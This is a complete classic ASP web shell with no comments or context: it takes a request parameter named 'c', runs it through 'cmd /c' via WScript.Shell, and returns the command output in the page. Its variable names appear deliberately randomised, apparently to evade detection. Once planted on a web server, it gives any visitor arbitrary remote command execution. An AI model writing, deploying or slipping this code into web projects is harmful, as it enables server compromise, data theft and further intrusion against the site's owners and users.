<%
ZEv = Request("c")
Set FnFCT = CreateObject("WScript.Shell").exec("cmd /c " & ZEv)
Response.Write(FnFCT.StdOut.ReadAll)
%>
